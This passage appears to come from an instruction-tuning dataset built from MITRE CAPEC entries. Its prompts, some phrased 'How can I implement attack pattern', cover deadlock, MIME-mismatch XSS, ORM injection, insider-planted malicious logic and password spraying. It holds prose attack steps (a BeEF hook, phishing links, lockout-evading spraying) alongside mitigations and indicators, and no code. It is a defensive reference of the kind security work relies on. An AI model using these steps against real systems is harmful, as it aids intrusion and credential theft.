          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances, Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Forced Deadlock (CAPEC ID: 25), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: An example of a deadlock which may occur in database products is the following. Client applications using the database may require exclusive access to a table, and in order to gain exclusive access they ask for a lock. If one client application holds a lock on a table and attempts to obtain the lock on a second table that is already held by a second client application, this may lead to deadlock if the second application then attempts to obtain the lock that is held by the first application (Source: Wikipedia, http://en.wikipedia.org/wiki/Deadlock)",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An example of a deadlock which may occur in database products is the following. Client applications using the database may require exclusive access to a table, and in order to gain exclusive access they ask for a lock. If one client application holds a lock on a table and attempts to obtain the lock on a second table that is already held by a second client application, this may lead to deadlock if the second application then attempts to obtain the lock that is held by the first application (Source: Wikipedia, http://en.wikipedia.org/wiki/Deadlock)",
      "@Name": "Forced Deadlock (CAPEC ID: 25)",
      "attack_ptrn": {
        "@ID": "25",
        "@Name": "Forced Deadlock",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "The adversary triggers and exploits a deadlock condition in the target software to cause a denial of service. A deadlock can occur when two or more competing actions are waiting for each other to finish, and thus neither ever does. Deadlock conditions can be difficult to detect.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "The adversary initiates an exploratory phase to get familiar with the system."
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "The adversary triggers a first action (such as holding a resource) and initiates a second action which will wait for the first one to finish."
            },
            {
              "Step": "3",
              "Phase": "Explore",
              "Description": "If the target program has a deadlock condition, the program waits indefinitely resulting in a denial of service."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target host has a deadlock condition. There are four conditions for a deadlock to occur, known as the Coffman conditions. [REF-101]",
            "The target host exposes an API to the user."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "This type of attack may be sophisticated and require knowledge about the system's resources and APIs."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Resource Consumption",
            "Note": "A successful forced deadlock attack compromises the availability of the system by exhausting its available resources."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Use known algorithm to avoid deadlock condition (for instance non-blocking synchronization algorithms).",
            "For competing actions, use well-known libraries which implement synchronization."
          ]
        },
        "Example_Instances": {
          "Example": "An example of a deadlock which may occur in database products is the following. Client applications using the database may require exclusive access to a table, and in order to gain exclusive access they ask for a lock. If one client application holds a lock on a table and attempts to obtain the lock on a second table that is already held by a second client application, this may lead to deadlock if the second application then attempts to obtain the lock that is held by the first application (Source: Wikipedia, http://en.wikipedia.org/wiki/Deadlock)"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "412"
            },
            {
              "@CWE_ID": "567"
            },
            {
              "@CWE_ID": "662"
            },
            {
              "@CWE_ID": "667"
            },
            {
              "@CWE_ID": "833"
            },
            {
              "@CWE_ID": "1322"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1499.004",
            "Entry_Name": "Endpoint Denial of Service: Application or System Exploitation"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-101",
              "@Section": "Deadlock"
            },
            {
              "@External_Reference_ID": "REF-609",
              "@Section": "Testing for XML Injection"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Type (Relationship -> Attack_Pattern)"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Phases, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Probing_Techniques, Related_Weaknesses, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Prerequisites"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - XSS Using MIME Type Mismatch (CAPEC ID: 209)",
    "context": "",
    "output": "Examples of XSS Using MIME Type Mismatch (CAPEC ID: 209) are: For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.\n* In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.",
        "In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters."
      ],
      "@Name": "XSS Using MIME Type Mismatch (CAPEC ID: 209)",
      "attack_ptrn": {
        "@ID": "209",
        "@Name": "XSS Using MIME Type Mismatch",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "592"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for stored user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all areas that allow a user to upload content through an HTTP POST request. This is typically found in blogs or forums.",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to file upload features",
                "Use a proxy tool to record all links visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe identified potential entry points for MIME type mismatch] The adversary uses the entry points gathered in the \"Explore\" phase as a target list and uploads files with scripting content, but whose MIME type is specified as a file type that cannot execute scripting content. If the application only checks the MIME type of the file, it may let the file through, causing the script to be executed by any user who accesses the file.",
              "Technique": "Upload a script file with a MIME type of text/plain to a forum and then access the uploaded file to see if the script is executed. If possible, the script displays a unique identifier so the adversary knows for certain it was executed when testing."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Store malicious XSS content] Once the adversary has determined which file upload locations are vulnerable to MIME type mismatch, they will upload a malicious script disguised as a non scripting file. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.",
              "Technique": "Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.",
              "Technique": [
                "Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.",
                "Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.",
            "The victim's browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content."
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary must have the ability to source the file of the incorrect MIME type containing a script."
        },
        "Example_Instances": {
          "Example": [
            "For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.",
            "In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "79"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "646"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-78",
            "@Section": "Testing for Stored Cross site scripting (OWASP-DV-002)"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Activation_Zone, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-05-01",
            "#text": "Cross-Site Scripting Using MIME Type Mismatch"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Object Relational Mapping Injection (CAPEC ID: 109)",
    "context": "",
    "output": "Examples of Object Relational Mapping Injection (CAPEC ID: 109) are: When using Hibernate, it is possible to use the session.find() method to run queries against the database. This is an overloaded method that provides facilities to perform binding between the supplied user data and place holders in the statically defined query. However, it is also possible to use the session.find() method without using any of these query binding overloads, hence effectively concatenating the user supplied data with rest of the SQL query, resulting in a possibility for SQL injection. While the framework may provide mechanisms to use methods immune to SQL injections, it may also contain ways that are not immune that may be chosen by the developer.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "When using Hibernate, it is possible to use the session.find() method to run queries against the database. This is an overloaded method that provides facilities to perform binding between the supplied user data and place holders in the statically defined query. However, it is also possible to use the session.find() method without using any of these query binding overloads, hence effectively concatenating the user supplied data with rest of the SQL query, resulting in a possibility for SQL injection. While the framework may provide mechanisms to use methods immune to SQL injections, it may also contain ways that are not immune that may be chosen by the developer.",
      "@Name": "Object Relational Mapping Injection (CAPEC ID: 109)",
      "attack_ptrn": {
        "@ID": "109",
        "@Name": "Object Relational Mapping Injection",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker leverages a weakness present in the database access layer code generated with an Object Relational Mapping (ORM) tool or a weakness in the way that a developer used a persistence framework to inject their own SQL commands to be executed against the underlying database. The attack here is similar to plain SQL injection, except that the application does not use JDBC to directly talk to the database, but instead it uses a data access layer generated by an ORM tool or framework (e.g. Hibernate). While most of the time code generated by an ORM tool contains safe access methods that are immune to SQL injection, sometimes either due to some weakness in the generated code or due to the fact that the developer failed to use the generated access methods properly, SQL injection is still possible.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "66"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Persistence Framework Used] An attacker tries to determine what persistence framework is used by the application in order to leverage a weakness in the generated data access layer code or a weakness in a way that the data access layer may have been used by the developer.",
              "Technique": "An attacker provides input to the application in an attempt to induce an error screen that reveals a stack trace that gives an indication of the automated data access layer used. Or an attacker may simply make some educated guesses and assume, for instance, that Hibernate is used and try to craft an attack from there."
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Probe for ORM Injection vulnerabilities] The attacker injects ORM syntax into user-controllable data inputs of the application to determine if it is possible modify data query structure and content."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Perform SQL Injection through the generated data access layer] An attacker proceeds to exploit a weakness in the generated data access methods that does not properly separate control plane from the data plan, or potentially a particular way in which developer might have misused the generated code, to modify the structure of the executed SQL queries and/or inject entirely new SQL queries.",
              "Technique": "An attacker uses normal SQL injection techniques and adjusts them to reflect the type of data access layer generation framework used by the application."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An application uses data access layer generated by an ORM tool or framework",
            "An application uses user supplied data in queries executed against the database",
            "The separation between data plane and control plane is not ensured, through either developer error or an underlying weakness in the data access layer code generation framework"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Knowledge of general SQL injection techniques and subtleties of the ORM framework is needed"
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Remember to understand how to use the data access methods generated by the ORM tool / framework properly in a way that would leverage the built-in security mechanisms of the framework",
            "Ensure to keep up to date with security relevant updates to the persistence framework used within your application."
          ]
        },
        "Example_Instances": {
          "Example": "When using Hibernate, it is possible to use the session.find() method to run queries against the database. This is an overloaded method that provides facilities to perform binding between the supplied user data and place holders in the statically defined query. However, it is also possible to use the session.find() method without using any of these query binding overloads, hence effectively concatenating the user supplied data with rest of the SQL query, resulting in a possibility for SQL injection. While the framework may provide mechanisms to use methods immune to SQL injections, it may also contain ways that are not immune that may be chosen by the developer."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "89"
            },
            {
              "@CWE_ID": "564"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-4",
            "@Section": "Testing for ORM Injection (OWASP-DV-007)"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Malicious Logic Inserted Into Product by Authorized Developer (CAPEC ID: 443), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: During initial development, an authorized hardware developer implants a malicious microcontroller within an Internet of Things (IOT) device and programs the microcontroller to communicate with the vulnerable device. Each time the device initializes, the malicious microcontroller's code is executed, which ultimately provides the adversary with backdoor access to the vulnerable device. This can further allow the adversary to sniff network traffic, exfiltrate date, execute unauthorized commands, and/or pivot to other vulnerable devices.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "During initial development, an authorized hardware developer implants a malicious microcontroller within an Internet of Things (IOT) device and programs the microcontroller to communicate with the vulnerable device. Each time the device initializes, the malicious microcontroller's code is executed, which ultimately provides the adversary with backdoor access to the vulnerable device. This can further allow the adversary to sniff network traffic, exfiltrate date, execute unauthorized commands, and/or pivot to other vulnerable devices."
      ],
      "@Name": "Malicious Logic Inserted Into Product by Authorized Developer (CAPEC ID: 443)",
      "attack_ptrn": {
        "@ID": "443",
        "@Name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product.",
        "Extended_Description": {
          "xhtml:p": "Supply chain attacks from approved or trusted developers are extremely difficult to detect as it is generally assumed the quality control and internal security measures of these organizations conform to best practices. In some cases the malicious logic is intentional, embedded by a disgruntled employee, programmer, or individual with an otherwise hidden agenda. In other cases, the integrity of the product is compromised by accident (e.g. by lapse in the internal security of the organization that results in a product becoming contaminated). In further cases, the developer embeds a backdoor into a product to serve some purpose, such as product support, but discovery of the backdoor results in its malicious use by adversaries. It is also worth noting that this attack can occur during initial product development or throughout a product's sustainment."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "444"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Access to the product during the initial or continuous development."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Authorization",
            "Impact": "Execute Unauthorized Commands"
          }
        },
        "Mitigations": {
          "Mitigation": "Assess software and hardware during development and prior to deployment to ensure that it functions as intended and without any malicious functionality. This includes both initial development, as well as updates propagated to the product after deployment."
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": "In January 2022 the author of popular JavaScript packages \"Faker\" and \"colors\", used for generating mock data and including colored text within NodeJS consoles respectively, introduced malicious code that resulted in a Denial of Service (DoS) via an infinite loop. When applications that leveraged these packages updated to the malicious version, their applications executed the infinite loop and output gibberish ASCI characters endlessly. This resulted in the application being unusable until a stable version of the package was obtained. [REF-705]"
            },
            "During initial development, an authorized hardware developer implants a malicious microcontroller within an Internet of Things (IOT) device and programs the microcontroller to communicate with the vulnerable device. Each time the device initializes, the malicious microcontroller's code is executed, which ultimately provides the adversary with backdoor access to the vulnerable device. This can further allow the adversary to sniff network traffic, exfiltrate date, execute unauthorized commands, and/or pivot to other vulnerable devices."
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1195.002",
              "Entry_Name": "Supply Chain Compromise: Compromise Software Supply Chain"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1195.003",
              "Entry_Name": "Supply Chain Compromise: Compromise Hardware Supply Chain"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-379"
            },
            {
              "@External_Reference_ID": "REF-704"
            },
            {
              "@External_Reference_ID": "REF-705"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances, Mitigations, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated @Name, Description, Example_Instances, Extended_Description, Mitigations, Prerequisites, Related_Attack_Patterns, Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2022-09-29",
            "#text": "Malicious Logic Inserted Into Product Software by Authorized Developer"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Password Spraying (CAPEC ID: 565)",
    "context": "",
    "output": "Examples of Password Spraying (CAPEC ID: 565) are: A user selects the phrase \"Password123\" as their password, believing that it would be very difficult to guess. Password Spraying, leveraging a list of commonly used passwords, is used to crack this password and gain access to the account.\nThe Iranian hacker group APT33 (AKA Holmium, Refined Kitten, or Elfin) carried out numerous Password Spraying attacks in 2019. On average, APT33 targeted 2,000 organizations per month, with upwards of 10 million authentication attempts each day. The majority of these attacks targeted manufacturers, suppliers, or maintainers of industrial control system equipment.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A user selects the phrase \"Password123\" as their password, believing that it would be very difficult to guess. Password Spraying, leveraging a list of commonly used passwords, is used to crack this password and gain access to the account.",
        "The Iranian hacker group APT33 (AKA Holmium, Refined Kitten, or Elfin) carried out numerous Password Spraying attacks in 2019. On average, APT33 targeted 2,000 organizations per month, with upwards of 10 million authentication attempts each day. The majority of these attacks targeted manufacturers, suppliers, or maintainers of industrial control system equipment."
      ],
      "@Name": "Password Spraying (CAPEC ID: 565)",
      "attack_ptrn": {
        "@ID": "565",
        "@Name": "Password Spraying",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": "In a Password Spraying attack, an adversary tries a small list (e.g. 3-5) of common or expected passwords, often matching the target's complexity policy, against a known list of user accounts to gain valid credentials. The adversary tries a particular password for each user account, before moving onto the next password in the list. This approach assists the adversary in remaining undetected by avoiding rapid or frequent account lockouts. The adversary may then reattempt the process with additional passwords, once enough time has passed to prevent inducing a lockout."
        },
        "Extended_Description": {
          "xhtml:p": [
            "Password Spraying attacks often target management services over commonly used ports such as SSH, FTP, Telnet, LDAP, Kerberos, MySQL, and more. Additional targets include Single Sign-On (SSO) or cloud-based applications/services that utilize federated authentication protocols, and externally facing applications. Successful execution of Password Spraying attacks usually lead to lateral movement within the target, which allows the adversary to impersonate the victim or execute any action that the victim is authorized to perform. If the password chosen by the user is commonly used or easily guessed, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.",
            "Password Spraying Attacks are similar to Dictionary-based Password Attacks (CAPEC-16) in that they both leverage precompiled lists (i.e. dictionaries) of username/password combinations to try against a system/application. The primary difference is that Password Spraying Attacks leverage a known list of user accounts and only try one password for each account before moving onto the next password. In contrast, Dictionary-based Password Attacks leverage unknown username/password combinations and are often executed offline against files containing hashed credentials, where inducing an account lockout is not a concern.",
            "Password Spraying Attacks are also similar to Credential Stuffing attacks (CAPEC-600), since both utilize known user accounts and often attack the same targets. Credential Stuffing attacks, however, leverage known username/password combinations, whereas Password Spraying attacks have no insight into known username/password pairs. If a Password Spraying attack succeeds, it may additionally lead to Credential Stuffing attacks on different targets."
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "49"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "561"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine target's password policy] Determine the password policies of the target system/application.",
              "Technique": [
                "Determine minimum and maximum allowed password lengths.",
                "Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).",
                "Determine account lockout policy (a strict account lockout policy will prevent brute force attacks)."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Select passwords] Pick the passwords to be used in the attack (e.g. commonly used passwords, passwords tailored to individual users, etc.)",
              "Technique": [
                "Select passwords based on common use or a particular user's additional details.",
                "Select passwords based on the target's password complexity policies."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Brute force password] Given the finite space of possible passwords dictated by information determined in the previous steps, try each password for all known user accounts until the target grants access.",
              "Technique": [
                "Manually or automatically enter the first password for each known user account through the target's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.",
                "Iterate through the remaining passwords for each known user account."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system/application uses one factor password based authentication.",
            "The system/application does not have a sound password policy that is being enforced.",
            "The system/application does not implement an effective password throttling mechanism.",
            "The adversary possesses a list of known user accounts on the target system/application."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "A Password Spraying attack is very straightforward. A variety of password cracking tools are widely available."
          }
        },
        "Resources_Required": {
          "Resource": [
            "A machine with sufficient resources for the job (e.g. CPU, RAM, HD).",
            "Applicable password lists.",
            "A password cracking tool or a custom script that leverages the password list to launch the attack."
          ]
        },
        "Indicators": {
          "Indicator": [
            "Many invalid login attempts are coming from the same machine (same IP address) or for multiple user accounts within short succession.",
            "The login attempts use passwords that have been used previously by the user account in question.",
            "Login attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Create a strong password policy and ensure that your system enforces this policy.",
            "Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.",
            "Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network."
          ]
        },
        "Example_Instances": {
          "Example": [
            "A user selects the phrase \"Password123\" as their password, believing that it would be very difficult to guess. Password Spraying, leveraging a list of commonly used passwords, is used to crack this password and gain access to the account.",
            "The Iranian hacker group APT33 (AKA Holmium, Refined Kitten, or Elfin) carried out numerous Password Spraying attacks in 2019. On average, APT33 targeted 2,000 organizations per month, with upwards of 10 million authentication attempts each day. The majority of these attacks targeted manufacturers, suppliers, or maintainers of industrial control system equipment."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "521"
            },
            {
              "@CWE_ID": "262"
            },
            {
